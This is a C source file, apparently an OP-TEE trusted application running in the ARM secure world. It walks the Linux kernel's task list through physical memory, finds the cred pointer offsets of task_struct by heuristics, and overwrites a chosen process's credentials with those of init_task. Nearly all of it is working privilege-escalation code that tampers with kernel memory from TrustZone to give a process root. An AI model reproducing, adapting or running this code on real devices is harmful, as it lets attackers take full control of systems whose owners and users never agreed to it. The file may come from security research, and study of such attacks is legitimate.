#include "privilege_escalation.h"
#include "common.h"
#include "../linux.h"
#include "../utils.h"

#include <types_ext.h>


bool change_task_struct_creds(pid_t target_pid, paddr_t init_task_start, paddr_t task_struct_tasks_offset, paddr_t task_struct_pid_offset,
                              paddr_t task_struct_cred_offsets[NUM_CREDS], paddr_t virtual_address_offset, address_translation_function va_to_pa);
void find_task_struct_cred_offsets(paddr_t init_task_start, paddr_t task_struct_tasks_offset, paddr_t task_struct_name_offset, paddr_t task_struct_pid_offset,
                                      paddr_t virtual_address_offset, pid_t cred_pid, paddr_t task_struct_cred_offsets[NUM_CREDS], address_translation_function va_to_pa);


void find_task_struct_cred_offsets(paddr_t init_task_start, paddr_t task_struct_tasks_offset, paddr_t task_struct_name_offset, paddr_t task_struct_pid_offset,
                                      paddr_t virtual_address_offset, pid_t cred_pid, paddr_t task_struct_cred_offsets[NUM_CREDS], address_translation_function va_to_pa)
{
    const size_t NUM_SEARCHED_PAGES = 3;
    const size_t NUM_CRED_ATTEMPTS = 100000;
    const size_t MIN_CRED_PROPERTY_OCCURRENCE = 1000;

    for (int i = 0; i < NUM_CREDS; i++)
        task_struct_cred_offsets[i] = ERROR_ADDR;

    bool valid_offsets_found = false;
    paddr_t init_task_page = init_task_start & ~PAGE_MASK;

    struct mobj *mobjs[NUM_SEARCHED_PAGES];
    int num_loaded_pages = load_pages(init_task_page, NUM_SEARCHED_PAGES, mobjs);
    if (num_loaded_pages != NUM_SEARCHED_PAGES)
        return;
    uint64_t *vaddrs[NUM_SEARCHED_PAGES];
    mobjs_get_vas(mobjs, NUM_SEARCHED_PAGES, vaddrs);
    void *init_task_cred_candidate = NULL;
    size_t offset = init_task_start & PAGE_OFFSET_MASK;

    while (true)
    {
        size_t page_index = offset / PAGE_SIZE;
        size_t page_offset = offset & PAGE_OFFSET_MASK;

        // Find any virtual address in the struct
        init_task_cred_candidate = find_va(vaddrs[page_index], PAGE_SIZE, page_offset);
        if (init_task_cred_candidate == NULL)
        {
            if (page_index < NUM_SEARCHED_PAGES - 1)
            {
                offset = (offset & ~PAGE_MASK) + PAGE_SIZE;
                continue;
            }
            break;
        }

        // Check if it is a pointer to the task_struct itself, which occurs quite frequently
        if (*((uint64_t *)init_task_cred_candidate) != (init_task_start + virtual_address_offset))
        {
            // Check if the address occurs more than once
            size_t occurrences = 0;
            for (int i = 0; i < NUM_CREDS; i++)
                task_struct_cred_offsets[i] = ERROR_ADDR;
            for (size_t i = page_index; i < NUM_SEARCHED_PAGES && occurrences < NUM_CREDS; i++)
            {
                size_t current_page_offset = 0;
                if (i == page_index)
                    current_page_offset = page_offset;
                size_t page_occurrences = find_gw_offsets(vaddrs[i], PAGE_SIZE, current_page_offset, *((uint64_t *)init_task_cred_candidate), task_struct_cred_offsets + occurrences, NUM_CREDS - occurrences);
                for (size_t j = occurrences; j < occurrences + page_occurrences; j++)
                {
                    // Consider task_struct page offset
                    task_struct_cred_offsets[j] -= init_task_start & PAGE_OFFSET_MASK;
                    // Consider the page the offset is located on
                    task_struct_cred_offsets[j] += i * PAGE_SIZE;
                }
                occurrences += page_occurrences;
            }

            if (occurrences >= NUM_CREDS)
            {
                // Check for known field offsets to prevent false-positives
                bool valid = true;
                for (size_t i = 0; i < occurrences && valid; i++)
                {
                    if (task_struct_cred_offsets[i] == task_struct_tasks_offset)
                        valid = false;
                    if (task_struct_cred_offsets[i] == task_struct_name_offset)
                        valid = false;
                }

                paddr_t current_task = init_task_start;
                // If we still have a valid candidate, find the target task by its PID
                while (valid)
                {
                    paddr_t current_task_page = current_task & ~PAGE_MASK;
                    paddr_t pid_page = (current_task + task_struct_pid_offset) & ~PAGE_MASK;
                    struct mobj *pid_mobj = load_page(pid_page);
                    if (!pid_mobj)
                        return;

                    uint8_t *pid_page_vaddr = mobj_get_va(pid_mobj, 0);
                    pid_t *pid_vaddr = (pid_t *)(pid_page_vaddr + task_struct_pid_offset - (PAGE_SIZE - (current_task & PAGE_MASK)) - (pid_page - current_task_page - PAGE_SIZE));
                    pid_t task_pid = *pid_vaddr;
                    free_page(pid_mobj);

                    if (task_pid == cred_pid)
                    {
                        // Target task found

                        paddr_t cred_pages[NUM_CREDS];
                        struct mobj *cred_mobjs[NUM_CREDS];
                        uint8_t *cred_page_vaddrs[NUM_CREDS];
                        int mapped_pages = 0;
                        for (int cred_index = 0; cred_index < NUM_CREDS; cred_index++)
                        {
                            cred_pages[cred_index] = (current_task + task_struct_cred_offsets[cred_index]) & ~PAGE_MASK;
                            cred_mobjs[cred_index] = load_page(cred_pages[cred_index]);
                            if (!cred_mobjs[cred_index])
                            {
                                for (int i = cred_index - 1; i >= 0; i--)
                                    free_page(cred_mobjs[i]);
                                break;
                            }
                            cred_page_vaddrs[cred_index] = mobj_get_va(cred_mobjs[cred_index], 0);
                            mapped_pages++;
                        }
                        if (mapped_pages != NUM_CREDS)
                            break;

                        size_t identical_found = 0;
                        size_t difference_found = 0;
                        // The user-space application calls the access syscall in a loop to cause a difference between cred and real_cred pointers.
                        // Check the respective offsets (which contained identical values for init_task) for this difference.
                        for (size_t attempt = 0; attempt < NUM_CRED_ATTEMPTS && valid; attempt++)
                        {
                            uint64_t cred_values[NUM_CREDS];
                            for (size_t i = 0; i < NUM_CREDS; i++)
                                cred_values[i] = 0;

                            for (size_t cred_index = 0; cred_index < NUM_CREDS && task_struct_cred_offsets[cred_index] != ERROR_ADDR && valid; cred_index++)
                            {
                                uint64_t *cred_vaddr = (uint64_t *)(cred_page_vaddrs[cred_index] + task_struct_cred_offsets[cred_index] - (PAGE_SIZE - (current_task & PAGE_MASK)) - (cred_pages[cred_index] - current_task_page - PAGE_SIZE));
                                uint64_t cred = *cred_vaddr;

                                if (!is_va(cred))
                                {
                                    valid = false;
                                    break;
                                }

                                bool added = add_unique_value(cred_values, NUM_CREDS, cred);
                                if (cred_index > 0)
                                {
                                    if (added)
                                        difference_found++;
                                    else
                                        identical_found++;
                                }
                            }
                        }

                        for (int cred_index = 0; cred_index < NUM_CREDS; cred_index++)
                            free_page(cred_mobjs[cred_index]);

                        if (difference_found < MIN_CRED_PROPERTY_OCCURRENCE || identical_found < MIN_CRED_PROPERTY_OCCURRENCE)
                            valid = false;

                        if (valid)
                            break;
                    }

                    paddr_t tasks_page = (current_task + task_struct_tasks_offset) & ~PAGE_MASK;
                    struct mobj *tasks_mobj = load_page(tasks_page);
                    if (!tasks_mobj)
                        return;

                    uint8_t *tasks_page_vaddr = mobj_get_va(tasks_mobj, 0);
                    uint8_t *tasks_vaddr = tasks_page_vaddr + task_struct_tasks_offset - (PAGE_SIZE - (current_task & PAGE_MASK)) - (tasks_page - current_task_page - PAGE_SIZE);
                    current_task = (*va_to_pa)(*((uint64_t *)(tasks_vaddr)) - task_struct_tasks_offset, virtual_address_offset);
                    free_page(tasks_mobj);
                }

                if (valid)
                {
                    valid_offsets_found = true;
                    break;
                }
            }
        }

        // Continue right after the previously checked value
        offset = (page_index * PAGE_SIZE) + ((uint64_t)init_task_cred_candidate & PAGE_OFFSET_MASK) + sizeof(uint64_t);
    }

    free_pages(mobjs, NUM_SEARCHED_PAGES);

    if (valid_offsets_found)
        return;

    for (int i = 0; i < NUM_CREDS; i++)
        task_struct_cred_offsets[i] = ERROR_ADDR;
}


bool change_task_struct_creds(pid_t target_pid, paddr_t init_task_start, paddr_t task_struct_tasks_offset, paddr_t task_struct_pid_offset,
                              paddr_t task_struct_cred_offsets[NUM_CREDS], paddr_t virtual_address_offset, address_translation_function va_to_pa)
{
    paddr_t current_task = init_task_start;
    uint64_t init_task_cred_vaddr = 0;
    bool first = true;
    while(first || current_task != init_task_start)
    {
        paddr_t current_task_page = current_task & ~PAGE_MASK;

        paddr_t pid_page = (current_task + task_struct_pid_offset) & ~PAGE_MASK;
        struct mobj *pid_mobj = load_page(pid_page);
        if (!pid_mobj)
            return false;

        uint8_t *pid_page_vaddr = mobj_get_va(pid_mobj, 0);
        uint8_t *pid_vaddr = (uint8_t *)(pid_page_vaddr + task_struct_pid_offset - (PAGE_SIZE - (current_task & PAGE_MASK)) - (pid_page - current_task_page - PAGE_SIZE));
        bool is_target_task = *((pid_t *) pid_vaddr) == target_pid;
        free_page(pid_mobj);

        for (int i = 0; i < NUM_CREDS && task_struct_cred_offsets[i] != ERROR_ADDR; i++)
        {
            paddr_t cred_page = (current_task + task_struct_cred_offsets[i]) & ~PAGE_MASK;
            struct mobj *cred_mobj = load_page(cred_page);
            if (!cred_mobj)
                return false;
            
            uint8_t *cred_page_vaddr = mobj_get_va(cred_mobj, 0);
            uint8_t *cred_vaddr = cred_page_vaddr + task_struct_cred_offsets[i] - (PAGE_SIZE - (current_task & PAGE_MASK)) - (cred_page - current_task_page - PAGE_SIZE);
            if (first)
                init_task_cred_vaddr = *((uint64_t *)cred_vaddr);
            else if (is_target_task)
                *((uint64_t *)cred_vaddr) = init_task_cred_vaddr;
            free_page(cred_mobj);
        }

        if (is_target_task)
            return true;

        paddr_t tasks_page = (current_task + task_struct_tasks_offset) & ~PAGE_MASK;
        struct mobj *tasks_mobj = load_page(tasks_page);
        if (!tasks_mobj)
            return false;

        uint8_t *tasks_page_vaddr = mobj_get_va(tasks_mobj, 0);
        uint8_t *tasks_vaddr = tasks_page_vaddr + task_struct_tasks_offset - (PAGE_SIZE - (current_task & PAGE_MASK)) - (tasks_page - current_task_page - PAGE_SIZE);
        current_task = (*va_to_pa)(*((uint64_t *)(tasks_vaddr)) - task_struct_tasks_offset, virtual_address_offset);
        free_page(tasks_mobj);

        first = false;
    }
    return false;
}


TEE_Result elevate_privileges(uint32_t param_types, TEE_Param params[TEE_NUM_PARAMS])
{
    uint32_t exp_param_types = TEE_PARAM_TYPES(TEE_PARAM_TYPE_VALUE_INPUT,
                                               TEE_PARAM_TYPE_VALUE_INPUT,
                                               TEE_PARAM_TYPE_NONE,
                                               TEE_PARAM_TYPE_NONE);
    if (param_types != exp_param_types)
        return TEE_ERROR_BAD_PARAMETERS;

    pid_t target_pid = params[0].value.a;
    pid_t cred_pid = params[1].value.a;

    paddr_t uefi_header_addr = find_kernel_entrypoint();
    IMSG("uefi header address: %p\n", (void *)uefi_header_addr);
    if (uefi_header_addr == ERROR_ADDR)
        return TEE_ERROR_GENERIC;

    paddr_t init_task_name_addr = find_init_task_name(uefi_header_addr);
    IMSG("init_task name address: %p\n", (void *)init_task_name_addr);
    if (init_task_name_addr == ERROR_ADDR)
        return TEE_ERROR_GENERIC;

    paddr_t init_task_start = find_init_task_struct_signature(init_task_name_addr);
    IMSG("init_task start address: %p\n", (void *)init_task_start);
    if (init_task_start == ERROR_ADDR)
        return TEE_ERROR_GENERIC;

    paddr_t task_struct_name_offset = init_task_name_addr - init_task_start;
    IMSG("task_struct.comm offset: %lx\n", task_struct_name_offset);
    if (task_struct_name_offset == ERROR_ADDR)
        return TEE_ERROR_GENERIC;

    paddr_t virtual_address_offset = find_virtual_offset(init_task_start);
    IMSG("kernel virtual address offset (kimage_voffset): %lx\n", virtual_address_offset);
    if (virtual_address_offset == ERROR_ADDR)
        return TEE_ERROR_GENERIC;

    address_translation_function va_to_pa = NULL;
    paddr_t task_struct_tasks_offset = ERROR_ADDR;
    for (int i = 0; i < NUM_TRANSLATION_FUNCTIONS && task_struct_tasks_offset == ERROR_ADDR; i++)
    {
        IMSG("trying translation function %d\n", i);
        va_to_pa = available_translation_functions[i];
        task_struct_tasks_offset = find_task_struct_tasks_offset(init_task_start, task_struct_name_offset, virtual_address_offset, va_to_pa);
    }
    IMSG("task_struct.tasks offset: %lx\n", task_struct_tasks_offset);
    if (task_struct_tasks_offset == ERROR_ADDR)
        return TEE_ERROR_GENERIC;

    paddr_t task_struct_pid_offset = find_task_struct_pid_offset(init_task_start, task_struct_tasks_offset, virtual_address_offset, va_to_pa);
    IMSG("task_struct.pid offset: %lx\n", task_struct_pid_offset);
    if (task_struct_pid_offset == ERROR_ADDR)
        return TEE_ERROR_GENERIC;

    IMSG("tasks:\n");
    print_tasks(init_task_start, task_struct_tasks_offset, task_struct_name_offset, task_struct_pid_offset, virtual_address_offset, va_to_pa);

    paddr_t task_struct_cred_offsets[NUM_CREDS];
    find_task_struct_cred_offsets(init_task_start, task_struct_tasks_offset, task_struct_name_offset, task_struct_pid_offset, virtual_address_offset, cred_pid, task_struct_cred_offsets, va_to_pa);
    IMSG("task_struct.cred offsets:\n");
    for (int i = 0; i < NUM_CREDS && task_struct_cred_offsets[i] != ERROR_ADDR; i++)
        IMSG("\t%lx\n", task_struct_cred_offsets[i]);
    if (task_struct_cred_offsets[0] == ERROR_ADDR)
        return TEE_ERROR_GENERIC;

    IMSG("changing permissions of pid %d\n", target_pid);
    bool cred_change_successful = change_task_struct_creds(target_pid, init_task_start, task_struct_tasks_offset,
                                                           task_struct_pid_offset, task_struct_cred_offsets, 
                                                           virtual_address_offset, va_to_pa);
    if (cred_change_successful)
    {
        IMSG("changed permissions\n");
        return TEE_SUCCESS;
    }
    else
    {
        IMSG("could not change permissions\n");
        return TEE_ERROR_GENERIC;
    }
}
